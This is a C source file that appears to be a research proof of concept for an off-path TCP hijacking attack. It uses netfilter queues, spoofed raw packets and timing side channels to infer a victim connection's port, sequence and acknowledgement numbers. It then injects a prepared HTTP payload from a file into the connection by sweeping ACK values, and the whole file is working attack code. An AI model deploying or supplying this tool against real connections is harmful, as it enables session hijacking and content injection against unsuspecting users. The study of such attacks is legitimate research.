#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <linux/types.h>
#include <linux/netfilter.h> /* for NF_ACCEPT */
#include <signal.h>
#include <algorithm>
#include <math.h>

#include <libnetfilter_queue/libnetfilter_queue.h>
// #include <libnet.h>

#include "server.h"
#include "hping2.h"
#include "parse.h"
#include "websocket/websocket.h"

volatile static int ack_nums = 0;
typedef void* (*CallbackType)(void*);
static void (*callback)() = NULL;
static Packet packet, cmd_packet;
static struct tcphdr_bsd tcp, cmd_tcp;
static uint64_t last_time, last_time_after, last_time_diff;
static volatile bool FLAG = true;
static struct Hosts* hosts = NULL;

#define make_str(pointer, str, len) { \
	pointer = (char*) malloc(len+1);\
	strncpy(pointer, str, len);\
	pointer[len] = '\0';\
}

#define NONE_INFERENCE        0
#define PORT_INFERENCE        1
#define PORT_COMPARE          2
#define PORT_INFERENCE_STAGE2 3
#define SEQ_INFERENCE         4
#define SEQ_INFERENCE_STAGE2  5
#define SEQ_COMPARE1          6
#define SEQ_COMPARE2		  7
#define ACK_INFERENCE         8
#define ACK_INFERENCE_STAGE2  9
#define ACK_INFERENCE_COMPARE 10
#define WARMUP                11
#define MEASURE_RIGHT         12
#define MEASURE_WRONG         13
#define MEASURE_IP            14
#define MEASURE_IP_COMPARE    15

static int cur_state = NONE_INFERENCE;
static int counter = 0;

#define TEN_PACKETS 10
#define TOTAL_PACKETS 30
#define TIME_INTERVAL 3000
#define TIMEOUT_INTERVAL 500000
#define CHALLENGE_ACK_INFERENCE 256 

// function
static void all_callback();
static void* idle(void* data);

//Auto adjustment parameters
static uint64_t SEQ_THRESHOLD = 2500;
static uint64_t SEQ_DIFF_THRESHOLD = 800;
static uint64_t MAX_FULL_LATENCY = 10000;

//Flags
#ifdef DOUBLE_SEQ
static bool DOUBLE_SEQ_FLAG = true;
#else
static bool DOUBLE_SEQ_FLAG = false;
#endif

uint64_t rdtsc_nofence() {
    uint64_t a, d;
    asm volatile ("rdtsc" : "=a" (a), "=d" (d));
    a = (d<<32) | a;
    return a;
}

uint64_t microtime() {
	struct timeval tv;
	gettimeofday(&tv, NULL);
	return tv.tv_sec * 1000000 + tv.tv_usec;
}

uint64_t absolute_value_diff(uint64_t a, uint64_t b) {
	if (a > b) return a - b;
	else return b - a;
}

static bool need_resolve(char* host) {
	int len = strlen(host);
	for (int i = 0; i < len; i++) {
		if (host[i] != '.' && (host[i] > 57 || host[i] < 48))
			return true;
	}
	return false;
}

static uint64_t start_infer, stop_infer;
void signal_handler(int sig) {
	stop_infer = microtime();
	printf("ip addr: %s\n", packet.dip);
	printf("process time: %lu\n", stop_infer - start_infer);
	printf("counter: %d\n", counter);
	printf("ack_nums: %d\n", ack_nums);
	printf("guessed port: %u\n", packet.sport);
	printf("guessed seq: %x\n", tcp.th_seq);
	printf("SEQ_THRESHOLD: %lu\n", SEQ_THRESHOLD);
	printf("SEQ_DIFF_THRESHOLD: %lu\n", SEQ_DIFF_THRESHOLD);
	printf("MAX_FULL_LATENCY: %lu\n", MAX_FULL_LATENCY);
	if (DOUBLE_SEQ_FLAG)
		printf("DOUBLE_SEQ_FLAG: true\n");
	websocket_close(Global_websocket_fd);
	sleep(1);
	// cmd_tcp.th_seq = cmd_packet.seq + 1;
	// cmd_tcp.th_ack = cmd_packet.ack + 1;
	// send_tcp(cmd_packet.dport, cmd_packet.sport, 0, 64, (unsigned char*)"s", 1, &cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL);
	exit(0);
}

void set_timeout(int n) {
	struct itimerval timer;
	timer.it_value.tv_sec = 0;
	timer.it_value.tv_usec = n; //150000;
	timer.it_interval.tv_sec = 0;
	timer.it_interval.tv_usec = 0;
	setitimer(ITIMER_REAL, &timer, NULL);
}

static void create_thread(CallbackType handler) {
	//thread
	pthread_attr_t attr;
	pthread_t child;

	//start a new thread
	pthread_attr_init(&attr);
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
	if (pthread_create(&child, &attr, handler, NULL) != 0) {
		printf("thread creation error\n");
	}
}

static void dummy_callback() {
	// printf("consume one ack here\n");
}

static void* close_wrapper(void* data) {
	signal_handler(0);
	return NULL;
}

static void closeup() {
	printf("closeup\n");
	callback = &dummy_callback;
	FLAG = false;
	create_thread(close_wrapper);
}

static char *start, *end, *infer;
static int start_size, end_size, frame_size;

static uint64_t port_infer(Packet* packet, struct tcphdr_bsd* tcp) {
	int i, packet_size;
	tcp->th_flags = TH_PUSH | TH_ACK;
	char* payload = construct_tcp(packet->dport, packet->sport,
								(unsigned char*)infer, frame_size, tcp, 
								packet->dip, packet->sip, NULL, packet_size);

    if (Global_websocket_fd != -1) { //socket for communication

    	set_timeout(TIMEOUT_INTERVAL);
    	last_time = microtime();
    	send_tcp(cmd_packet.dport, cmd_packet.sport, 0, 64, (unsigned char*)"s", 1, &cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL);

    	for (i = 0; i < TOTAL_PACKETS; i++) {
    		send_ip_handler(0, 64, packet->dip, packet->sip, payload, packet_size);
    	}

    	send_tcp(cmd_packet.dport, cmd_packet.sport, 0, 64,(unsigned char*)"e", 1, &cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL);
    	last_time_after = microtime();
	}
	release_tcp(payload);
	return 0;
}

static uint64_t seq_infer(Packet* packet, struct tcphdr_bsd* tcp, const int n) {
	int i, packet_size;

	char* payload = construct_tcp(packet->dport, packet->sport,
								/*(unsigned char*)infer, frame_size,*/
								NULL, 0, 
								tcp, packet->dip, packet->sip, NULL, packet_size);

	set_timeout(TIMEOUT_INTERVAL);
    if (Global_websocket_fd != -1) { //socket for communication
    	last_time = microtime();
    	send_tcp(cmd_packet.dport, cmd_packet.sport, 0, 64, (unsigned char*)"s", 1, &cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL);

    	for (i = 0; i < n; i++) {
    		send_ip_handler(0, 64, packet->dip, packet->sip, payload, packet_size);
    	}

    	send_tcp(cmd_packet.dport, cmd_packet.sport, 0, 64,(unsigned char*)"e", 1, &cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL);
    	last_time_after = microtime();
	}
	release_tcp(payload);
	return 0;
}

// send spoofed packets with in-window sequence number for our own connection
static uint64_t seq_infer_own(const int n) {
	int i, packet_size;

	cmd_tcp.th_seq = cmd_packet.ack + 10;
	char* payload = construct_tcp(cmd_packet.dport, cmd_packet.sport,
								/*(unsigned char*)infer, frame_size,*/
								NULL, 0, 
								&cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL, packet_size);

	cmd_tcp.th_seq = 0;

	set_timeout(TIMEOUT_INTERVAL);
    if (Global_websocket_fd != -1) { //socket for communication
    	last_time = microtime();
    	send_tcp(cmd_packet.dport, cmd_packet.sport, 0, 64, (unsigned char*)"s", 1, &cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL);

    	for (i = 0; i < n; i++) {
    		send_ip_handler(0, 64, cmd_packet.dip, cmd_packet.sip, payload, packet_size);
    	}

    	send_tcp(cmd_packet.dport, cmd_packet.sport, 0, 64,(unsigned char*)"e", 1, &cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL);
    	last_time_after = microtime();
	}
	release_tcp(payload);
	return 0;
}

static uint64_t ack_left = 0, ack_right = 0x100000000, cur_left_ack = 0, cur_right_ack = 0, cur_ack = 0;

void* probe(void* data) {
	usleep(TIME_INTERVAL);
	switch (cur_state) {
		case MEASURE_RIGHT:
			seq_infer_own(TOTAL_PACKETS);
			break;
		case MEASURE_WRONG:
		case SEQ_INFERENCE:
		case SEQ_INFERENCE_STAGE2:
		case SEQ_COMPARE1:
		case SEQ_COMPARE2:
			seq_infer(&packet, &tcp, TOTAL_PACKETS);
			break;
		case WARMUP:
		case MEASURE_IP:
		case MEASURE_IP_COMPARE:
			port_infer(&packet, &tcp);
			break;
		default:
			break;
	}
	return NULL;
}

void timeout_handler(int sig) {
	printf("timeout!!! %d\n", sig);
	if (cur_state == WARMUP) {
		counter = counter & ~1;
	} else {
		counter = 0;
	}

	if (sig == 2 || sig == 14) { //you have to warm up

		FLAG = false;
		callback = &dummy_callback;
		create_thread(idle);
		if (sig == 14)
			signal(SIGALRM, timeout_handler);
		return;
	}

	create_thread(probe);
}

static inline uint64_t minimal(uint64_t* array, int left, int right, int strip) { //[left, right)
	int i;
	uint64_t min_num = -1U;
	for (i = left; i < right; i+=strip) {
		if (array[i] < min_num)
			min_num = array[i];
	}
	return min_num;
}

#define ACK_WINDOW 140000

void* keep_router_busy(void* data) {
	for (int i = 0; i < 10; i++) {
		for (int j = 0; j < 10; j++)
			send_tcp(cmd_packet.dport, cmd_packet.sport, 0, 64, NULL, 0, &cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL);
		usleep(10000);
	}
	return NULL;
}

#define ACK_MAX_LATENCY 20000
#define ACK_DIFF_THRESHOLD 500
#define ACK_THRESHOLD 1500

#define SEQ_WINDOW 800000 
#define SEQ_MAX_LATENCY 10000

static uint64_t seq_left = 0, seq_right = 0x100000000, cur_seq = 0;
static uint64_t cur_window = SEQ_WINDOW;
static uint64_t initial_window = SEQ_WINDOW;

static void restart_seq() {
	// tcp.th_seq = seq_right;
	if (initial_window != cur_window)
		tcp.th_seq -= initial_window;
	if (tcp.th_seq % cur_window == 0)
		tcp.th_seq = (tcp.th_seq / cur_window) * cur_window;
	else
		tcp.th_seq = (tcp.th_seq / cur_window) * cur_window + cur_window;
	if (initial_window != cur_window)
		tcp.th_seq += initial_window;

	cur_seq = tcp.th_seq;

	seq_left = 0;
	seq_right = 0x100000000;
	cur_state = SEQ_INFERENCE;
	tcp.th_ack = 0;
	create_thread(probe);
}

static bool handle_seq(uint64_t delay, uint64_t diff) {
	static int /*dynamic_balance_diff = 0, */dynamic_balance_delay = 0;
	if ((SEQ_DIFF_THRESHOLD != -1 && diff <= SEQ_DIFF_THRESHOLD )
		|| (SEQ_THRESHOLD != -1 && delay <= SEQ_THRESHOLD)) {
		printf("get it %x\n", tcp.th_seq);
		if (SEQ_THRESHOLD != -1 && delay <= SEQ_THRESHOLD) {
			dynamic_balance_delay++;
		}
		if (dynamic_balance_delay > 100) {
			if (SEQ_THRESHOLD < 50) {
				SEQ_THRESHOLD = -1;
			} else {
				SEQ_THRESHOLD -= 50;
				printf("change SEQ_THRESHOLD to: %lu\n", SEQ_THRESHOLD);
			}
			dynamic_balance_delay = 0;
		}

		return true;
	} else {
		if (dynamic_balance_delay > 1)
			dynamic_balance_delay -= 1;

		if (DOUBLE_SEQ_FLAG) {
			if (tcp.th_ack == 0) {
				tcp.th_ack = 0x80000000;
			} else {
				cur_seq += cur_window;
				tcp.th_seq = cur_seq;
				tcp.th_ack = 0;
			}
		} else {
			cur_seq += cur_window;
			tcp.th_seq = cur_seq;
		}
#ifdef DEBUG
		printf("%lx %x\n", cur_seq, tcp.th_ack);
#endif
		return false;
	}
}

#define NUM_OF_REQUEST 150
#define OFFSET_PADDING 50
static int padding = 300;
static void* infer_seq_thread(void* data) {
	cur_state = SEQ_INFERENCE;
	cur_seq = cur_ack = 0; //seq;
	tcp.th_seq = cur_seq; //seq;
	tcp.th_ack = cur_ack;
	printf("start to infer seq\n");
	create_thread(probe);
	return NULL;
}

// static void* wait_and_inject(void* data) {
// 	char data_packet[2000];
// 	int data_size, data_size2;
// 	unsigned char buffer[12];

// 	FILE *file;
// 	file = fopen("http.txt", "r");
// 	if (file == NULL) {
// 		printf("open file error\n");
// 		goto Exit;
// 	}
// 	data_size = fread(data_packet+100, 1, 1900, file);
// 	printf("file size: %d\n", data_size);
// 	for (int i = 0; i < 100; i++) {
// 		data_packet[i] = ' ';
// 	}
// 	fclose(file);

// 	if (websocket_recv_frag(Global_websocket_fd, buffer, 12) < 0) {
// 		printf("Error on receiving msg\n");
// 		goto Exit;
// 	}
// 	buffer[8] = '\0';
// 	printf("ack number: %s\n", buffer);
// 	cur_ack = (unsigned int)strtol((char*)buffer, NULL, 16);
// 	printf("cur ack: %u\n", cur_ack);
// 	tcp.th_seq = cur_seq + NUM_OF_REQUEST * SEQ_DELTA + OFFSET_PADDING + padding + 134;
// 	tcp.th_ack = cur_ack;

// 	tcp.th_seq -= 100;
// 	tcp.th_ack += 334; //This is the length of the request raised by client
// 	printf("%x, %x\n", tcp.th_seq, tcp.th_ack);
// 	sleep(1);
// 	for (int i = 0; i < 5; i++) {
// 		send_tcp(packet.dport, packet.sport, 0, 64, (unsigned char*)data_packet, data_size+100, &tcp, packet.dip, packet.sip, NULL);
// 		tcp.th_ack += ACK_WINDOW;
// 	}
// 	// for (int i = 0; i < 10; i++)
// 		// send_tcp(cmd_packet.dport, cmd_packet.sport, 0, 64, NULL, 0, &cmd_tcp, cmd_packet.dip, cmd_packet.sip, NULL);
// 	closeup();

// Exit:
// 	return NULL;
// }

static void* infer_ack_thread(void* data) {
	//send command to scale up window size
	unsigned char buffer[12];
	char data_packet[2000];
	FILE *file;
	int data_size;
	// uint64_t seq;
	// int tmp;
	cur_state = SEQ_INFERENCE;
	
	callback = &dummy_callback; //make sure we dont invoke callback
	FLAG = false;

	file = fopen("http.txt", "r");
	if (file == NULL) {
		printf("open file error\n");
		goto Exit;
	}
	data_size = fread(data_packet+padding, 1, 2000 - padding, file);
	printf("file size: %d\n", data_size);
	for (int i = 0; i < padding; i++) {
		data_packet[i] = ' ';
	}
	fclose(file);

	websocket_send_frame(Global_websocket_fd, (unsigned char*)"up", strlen("up"), TEXT_FRAME, 0);
	if (websocket_recv_frag(Global_websocket_fd, buffer, 12) < 0) {
		printf("Error on receiving msg\n");
		goto Exit;
	}

	tcp.th_flags = TH_PUSH | TH_ACK;
	tcp.th_seq = tcp.th_seq + NUM_OF_REQUEST * SEQ_DELTA + OFFSET_PADDING;
	for (cur_ack = 0xffffffff; cur_ack >= ACK_WINDOW; cur_ack -= ACK_WINDOW) {
		tcp.th_ack = cur_ack;
		send_tcp(packet.dport, packet.sport, 0, 64, (unsigned char*)data_packet, data_size+padding, &tcp, packet.dip, packet.sip, NULL);
		// usleep(10);
	}
Exit:
	closeup();
	return NULL;
}

static uint32_t port_left = 49152, port_right = 65535; //32768
static uint16_t cur_port = port_left;

#define PORT_DIFF_THRESHOLD 2500
#define PORT_DIFF_MINIMAL 2000
#define PORT_THRESHOLD 5000

static void* idle(void* data) {
	FLAG = false;
	callback = &dummy_callback;
	
	for (int i = 0; i < 2; i++) {
		for (int j = 0; j < 10; j++)
			send_tcp(packet.dport, packet.sport, 0, 64, NULL, 0, &tcp, packet.dip, packet.sip, NULL);
		usleep(10000);
	}

	FLAG = true;
	callback = &all_callback;
	timeout_handler(0);
	return NULL;
}

struct Data {
	uint32_t delay, diff;
	// bool operator<(const Data& a) {return diff < a.diff;}
};
bool compare_diff(Data a, Data b) { return a.diff < b.diff; }
bool compare_delay(Data a, Data b) { return a.delay < b.delay; }

#define NUM_OF_DATA 100
static Data results[NUM_OF_DATA * 2];
static int mIndex = 0;
static void measure(uint64_t delay, uint64_t diff) {
	results[mIndex].delay = delay;
	results[mIndex].diff = diff;
	mIndex++;

	if (mIndex == NUM_OF_DATA) {
		cur_state = MEASURE_RIGHT;
		printf("---------------------\n");

		uint64_t total = 0, mean, standard_deviation;
		int i;

		std::sort(results, results+NUM_OF_DATA, compare_delay);
		for (i = 1; i < NUM_OF_DATA - 1; i++) //eliminate the largest and the smallest one 
			total += results[i].delay;
		mean = total / (NUM_OF_DATA - 2);
		for (i = 1, total = 0; i < NUM_OF_DATA - 1; i++)
			total += (results[i].delay - mean) * (results[i].delay - mean);
		total /= (NUM_OF_DATA - 3);
		standard_deviation = sqrt(total);
		MAX_FULL_LATENCY = mean + 5 * standard_deviation;
		printf("OK. MAX_FULL_LATENCY: %lu\n", MAX_FULL_LATENCY);

	} else if (mIndex == NUM_OF_DATA * 2) {
		//analyse data and come out with several threshold
		printf("+++++++++++++++++++++++\n");
		mIndex = 0;
		std::sort(results, results+NUM_OF_DATA, compare_diff);
		std::sort(results+NUM_OF_DATA, results+NUM_OF_DATA*2, compare_diff);
		int i = NUM_OF_DATA*2-1;
		for ( ; i > NUM_OF_DATA + NUM_OF_DATA / 2; i--) {
			int j = 0;
			for ( ; j < NUM_OF_DATA - 1; j++)
				if (results[j].diff >= results[i].diff)
					break;
			if (j < (NUM_OF_DATA) / 10) {
				printf("OK. threshold: %u\n", results[i].diff);
				SEQ_DIFF_THRESHOLD = results[i].diff / 100 * 100 + 100;
				break;
			}
		}

		if (i == NUM_OF_DATA + NUM_OF_DATA / 2) {
			printf("WARNING: you cannot differiate by diff %lu\n", SEQ_DIFF_THRESHOLD);
			SEQ_DIFF_THRESHOLD = -1;
		}

		std::sort(results, results+NUM_OF_DATA, compare_delay);
		std::sort(results+NUM_OF_DATA, results+NUM_OF_DATA*2, compare_delay);
		i = NUM_OF_DATA*2-1;
		for ( ; i > NUM_OF_DATA + NUM_OF_DATA / 2; i--) {
			int j = 0;
			for ( ; j < NUM_OF_DATA - 1; j++)
				if (results[j].delay >= results[i].delay)
					break;
			if (j < (NUM_OF_DATA) / 10) {
				printf("OK. threshold: %u\n", results[i].delay);
				SEQ_THRESHOLD = results[i].delay / 100 * 100 + 100;
				break;
			}
		}

		if (i == NUM_OF_DATA + NUM_OF_DATA / 2) {
			printf("WARNING: you cannot differiate by RTT %lu\n", SEQ_THRESHOLD);
			SEQ_THRESHOLD = -1;
		}

		if (/*SEQ_THRESHOLD == -1 && */SEQ_DIFF_THRESHOLD == -1) {
			if (!DOUBLE_SEQ_FLAG) { 
				DOUBLE_SEQ_FLAG = true;
				cur_state = MEASURE_WRONG;
				mIndex = 0;
				goto probe;
			} else {
				closeup();
				return;
			}
		}

		// if (SEQ_DIFF_THRESHOLD == -1) {
		// 	cur_state = MEASURE_WRONG;
		// 	mIndex = 0;
		// 	goto probe;
		// }

		// closeup();
		// return;


		//seq inference
		cur_state = SEQ_INFERENCE;
		create_thread(infer_seq_thread);
		return;
	}

probe:
	create_thread(probe);
}

static void all_callback() {
	uint64_t end_time, diff, delay;
	static uint64_t prev_diff, prev_delay, prev_delay2, prev_diff2;
	static int state = 0, iters = 0;
	// int tmp;
    counter++;

    switch (counter % 2) {
    	case 1:
	    	last_time_diff = microtime();
	    	return;
	    case 0:
	    	set_timeout(0);
	    	end_time = microtime();
	    	diff = end_time - last_time_diff;
	    	delay = end_time - last_time_after;
	    	// printf("[+]%d\n", ack_nums);
#ifdef DEBUG
	    	printf("%lu %lu %lu\n", end_time - last_time, delay, diff);
#endif
	    	if ((diff > delay && diff - delay > TIME_INTERVAL) || diff > end_time - last_time) { //we must accept an extra one, let's ignore the previous one.
	    		last_time_diff = end_time;
	    		counter--;
	    		set_timeout(TIMEOUT_INTERVAL);
	    		return;
	    	}

			if (delay > MAX_FULL_LATENCY && 
				cur_state != WARMUP && cur_state != MEASURE_WRONG) { // For WARMUP, MEASURE_RIGHT, MEASURE_WRONG cases
				create_thread(probe);
				return;
			}

			// if (diff < 500 && cur_state == MEASURE_WRONG) {
			// 	create_thread(probe);
			// 	return;
			// }

	    	switch (cur_state) {
	    		case WARMUP:
	    			if (hosts->num > 1) {
	    				if (counter % 4 == 0) {
	    					strncpy(packet.dip, hosts->ips[0], INET_ADDRSTRLEN);
	    				} else {
	    					strncpy(packet.dip, hosts->ips[1], INET_ADDRSTRLEN);
	    				}
	    			}
	    			if (counter == 120 * 2) {
	    				printf("---------------------------------\n");
	    				if (hosts->num == 1) {
	    				// sleep(1);
#ifdef AUTO_ADJUST
	    					cur_state = MEASURE_WRONG;
#else
		    				//seq inference
			    			cur_state = SEQ_INFERENCE;
							state = 0;
							create_thread(infer_seq_thread);
							return;
#endif
						} else {
							strncpy(packet.dip, hosts->ips[0], INET_ADDRSTRLEN);
							cur_state = MEASURE_IP;
							state = 0;
						}
	    			}
	    			create_thread(probe);
	    			break;
	    		case MEASURE_IP:
	    			prev_diff = diff;
	    			prev_delay = delay;
	    			strncpy(packet.dip, hosts->ips[1], INET_ADDRSTRLEN);
	    			cur_state = MEASURE_IP_COMPARE;
	    			create_thread(probe);
	    			break;
	    		case MEASURE_IP_COMPARE:
	    			if (prev_diff < diff) {
	    				state++;
	    			} else {
	    				state--;
	    			}
	    			cur_state = MEASURE_IP;
	    			strncpy(packet.dip, hosts->ips[0], INET_ADDRSTRLEN);
	    			
	    			if (state == 2) {
	    				cur_state = MEASURE_WRONG;
	    				state = 0;
	    				strncpy(packet.dip, hosts->ips[1], INET_ADDRSTRLEN);
	    				printf("get ip address: %s\n", packet.dip);
	    			} else if (state == -2) {
	    				cur_state = MEASURE_WRONG;
	    				state = 0;
	    				strncpy(packet.dip, hosts->ips[0], INET_ADDRSTRLEN);
	    				printf("get ip address: %s\n", packet.dip);
	    			}
	    			create_thread(probe);
	    			break;
	    		case MEASURE_RIGHT:
	    		case MEASURE_WRONG:
	    			measure(delay, diff);
	    			break;
				case SEQ_INFERENCE:
					if (handle_seq(delay, diff)) {
						state++;
						if (state == 3) {
							printf("here you are\n");
							if (tcp.th_seq > cur_window)
								seq_left = tcp.th_seq - cur_window;
							else
								seq_left = 0;
							seq_right = tcp.th_seq;
							cur_seq = (seq_left + seq_right) / 2;
							tcp.th_seq = cur_seq;
							cur_state = SEQ_INFERENCE_STAGE2;
							state = 0;
						}
					} else {
						state = 0;
						if (cur_seq > seq_right) {
							printf("failed in seq inference\n");
							if (initial_window != cur_window) {
								cur_window /= 2;
							}
							initial_window /= 2;
							cur_seq = initial_window;
							tcp.th_seq = cur_seq;
							printf("shrink the window size to %lu\n", cur_window);
							if (cur_window == (SEQ_WINDOW >> 2)) {
								closeup();
								return;
							}
						}
					}
					create_thread(probe);
					break;
				case SEQ_INFERENCE_STAGE2:
					tcp.th_seq = seq_left - 1;
					prev_diff = diff;
					prev_delay = delay;
					cur_state = SEQ_COMPARE1;
					create_thread(probe);
					break;
				case SEQ_COMPARE1:
					tcp.th_seq = seq_right;
					prev_diff2 = diff;
					prev_delay2 = delay;
					cur_state = SEQ_COMPARE2;
					create_thread(probe);
					break;
				case SEQ_COMPARE2:
					//compare the distance 
					// guessed: prev_diff, prev_delay; left-1: prev_diff2, prev_delay2; right: diff, delay
					if (prev_diff2 <= diff) {
						printf("it shouldn't happen\n");
						// if (seq_right - seq_left <= 128) {
						// 	state = 0;
						// 	iters++;
						// } else {
						// 	iters = 0;
						// 	state = 0;
						// 	restart_seq();
						// 	return;
						// }
						state = 0;
						iters++;
					} else if (absolute_value_diff(prev_diff, prev_diff2) < absolute_value_diff(prev_diff, diff)) {
						if (prev_diff > diff && prev_diff - diff > 400) {
							state++;
							if (state == 2) {
								seq_left = cur_seq + 1;
								state = 0;
								iters = 0;
							}
						} else {
							state = 0;
							iters++;
						}
					} else {
						if (prev_diff2 > prev_diff && prev_diff2 - prev_diff > 400) {
							state--;
							if (state == -2) {
								seq_right = cur_seq;
								state = 0;
								iters = 0;
							}
						} else {
							state = 0;
							iters++;
						}
					}

					if (iters == 3) {
						//restart
						iters = 0;
						restart_seq();
						return;
					}

					if (seq_left == seq_right && seq_left != 0) {
						printf("get seq num: %lx\n", seq_left);
						tcp.th_seq = cur_seq = seq_left; 
						cur_state = ACK_INFERENCE;
						state = 0;
						if (DOUBLE_SEQ_FLAG) {
							ack_left = tcp.th_ack;
							if (ack_left == 0)
								ack_right = 0x80000000;
							printf("left: %lx, right: %lx\n", ack_left, ack_right);
							cur_right_ack = (ack_left + ack_right) >> 1;
							cur_left_ack = (cur_right_ack + 0x80000000) & 0xffffffff;
							tcp.th_ack = cur_left_ack;
							printf("cur_left: %lx, cur_right: %lx\n",  cur_left_ack, cur_right_ack);
						}
						printf("pause here\n");
						sleep(3);
						create_thread(infer_ack_thread);
						// closeup();
						return;
					}
					printf("seq left: %lx, right: %lx\n", seq_left, seq_right);
					cur_seq = (seq_left + seq_right) / 2;
					tcp.th_seq = cur_seq;
					cur_state = SEQ_INFERENCE_STAGE2;

					create_thread(probe);
					break;
			}
	    	return;
	}
}

static void* thread_cb(void* data) {
	unsigned char buffer[12];

	pthread_mutex_lock(&socket_lock);

#ifdef WEBSOCKET
	if (websocket_recv_frag(Global_websocket_fd, buffer, 12) < 0) {
		printf("Error on receiving msg\n");
		goto Exit;
	}
	printf("receive data: %s\n", buffer);
#endif

Exit:
    return NULL;
}

static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfgmsg,
                struct nfq_data *nfa, void *data) {
	struct nfqnl_msg_packet_hdr *ph;
	u_int32_t id;
	int len, ret = 0;//, frame_size;
	unsigned char *payload;
	//thread
	pthread_attr_t attr;
	pthread_t child;
	//inference
	uint32_t seq;

	ph = nfq_get_msg_packet_hdr(nfa);
	id = ntohl(ph->packet_id);
	
	ack_nums++;
	if (ack_nums == 1) {
		ret = nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
		len = nfq_get_payload(nfa, &payload);
		get_ip((struct iphdr*)payload, payload, len, &packet);
		// parse_ip_packet((struct iphdr*)payload, payload, len, &packet, false);
	    printf("sip: %s, dip: %s, sport: %u\n", packet.sip, packet.dip, packet.sport);
	    tcp.th_flags = TH_PUSH | TH_ACK; // | TH_RST;// | TH_URG;
		tcp.th_seq = tcp.th_ack = 0;
		tcp.th_win = 65535;
		packet.dport = 80;
		
		//start a new thread
		pthread_attr_init(&attr);
		pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
		if (pthread_create(&child, &attr, thread_cb, &packet) != 0) {
			printf("thread creation error\n");
		}
		return ret;
	}

	// printf("ack num: %d\n", ack_nums);
	if (callback != NULL) {
		ret = nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
		len = nfq_get_payload(nfa, &payload);
		// ack = get_ack((struct iphdr*)payload, payload, len);
		seq = get_seq((struct iphdr*)payload, payload, len);

		if (seq == cmd_packet.seq - 1) {
			printf("It's a keep-alive ACK\n");
			return ret;
		}

		(*callback)();
		
	} else {
		ret = nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
		len = nfq_get_payload(nfa, &payload);
		parse_ip_packet((struct iphdr*)payload, payload, len, &cmd_packet, 0);
		cmd_tcp.th_flags = TH_ACK | TH_PUSH;
		cmd_tcp.th_win = 65535;
		cmd_tcp.th_seq = 0; //cmd_packet.ack;
		cmd_tcp.th_ack = 0; //cmd_packet.seq + cmd_packet.size;

		if (cmd_packet.size == 8) {
			//register
			printf("receive ack num: %d\n", ack_nums);

			if (need_resolve(SERVER_HOST)) {
				hosts = getipbyhostname((char*)SERVER_HOST);
				if (hosts->num == 0) {
					printf("%s\n", "cannot get server ip");
					exit(1);
				} else if (hosts->num > 2) {
					fprintf(stderr, "%s\n", "Sorry, more than 2 IP addresses were found, and we don't support it yet");
					exit(1);
				}
				printf("server ip addr: %s\n", hosts->ips[0]);
				strncpy(packet.dip, hosts->ips[0], INET_ADDRSTRLEN);
			} else {
				printf("don't need to resolve address\n");
				hosts = (struct Hosts*)malloc(sizeof(struct Hosts));
				hosts->num = 1;
				hosts->ips[0] = (char*)malloc(INET_ADDRSTRLEN);
				strncpy(hosts->ips[0], SERVER_HOST, INET_ADDRSTRLEN);
				strncpy(packet.dip, SERVER_HOST, INET_ADDRSTRLEN);
			}

			FLAG = true;
			callback = &all_callback;
			
#ifndef INFER_PORT
			cur_port = cmd_packet.sport + 1;
			printf("get port number: %u\n", cur_port);
#else
			cur_port = port_left;
#endif
			packet.sport = cur_port;
			cur_seq = 0; //seq;
			cur_ack = 0;
			tcp.th_seq = cur_seq;
			tcp.th_ack = 0;
			cur_left_ack = 0;
			cur_right_ack = 0x80000000;  
			cur_state = WARMUP;
			start_infer = microtime();
			counter = 0;
			create_thread(probe);

		}
	}
    return ret;
}

static void init() {

	thread_server_start();
	sockraw = open_sockraw();

#ifdef WEBSOCKET
	start = websocket_make_frame((unsigned char*)"s", strlen("s"), TEXT_FRAME, 0, start_size);
	end = websocket_make_frame((unsigned char*)"e", strlen("e"), TEXT_FRAME, 0, end_size);
#else
	start_size = 1;
	make_str(start, "s", start_size)
	end_size = 1;
	make_str(end, "e", end_size)
#endif
	frame_size = 1;
	make_str(infer, "h", frame_size)

	//register signal handler
	signal(SIGINT, signal_handler);
	signal(SIGALRM, timeout_handler);
}

int main(int argc, char **argv) {

	init();

	struct nfq_handle *h;
	struct nfq_q_handle *qh;
	// struct nfnl_handle *nh;
	int fd;
	int rv;
	char buf[4096] __attribute__ ((aligned));
	printf("opening library handle\n");
	h = nfq_open();
	if (!h) {
		fprintf(stderr, "error during nfq_open()\n");
		exit(1);
	}

	printf("unbinding existing nf_queue handler for AF_INET (if any)\n");
	if (nfq_unbind_pf(h, AF_INET) < 0) {
		perror("error during nfq_unbind_pf()\n");
	}

	printf("binding nfnetlink_queue as nf_queue handler for AF_INET\n");
	if (nfq_bind_pf(h, AF_INET) < 0) {
		fprintf(stderr, "error during nfq_bind_pf()\n");

		exit(1);
	}

	printf("binding this socket to queue '80'\n");
	qh = nfq_create_queue(h,  80, &cb, NULL);
	if (!qh) {
		fprintf(stderr, "error during nfq_create_queue()\n");
		exit(1);
	}

	printf("setting copy_packet mode\n");
	if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
		fprintf(stderr, "can't set packet_copy mode\n");
		exit(1);
	}


	fd = nfq_fd(h);
    while ((rv = recv(fd, buf, sizeof(buf), 0)) && rv >= 0) { 
		nfq_handle_packet(h, buf, rv);
	}

    printf("unbinding from queue 0\n");
    nfq_destroy_queue(qh);

#ifdef INSANE
	/* normally, applications SHOULD NOT issue this command, since
	 *      * it detaches other programs/sockets from AF_INET, too ! */
	printf("unbinding from AF_INET\n");
	nfq_unbind_pf(h, AF_INET);
#endif

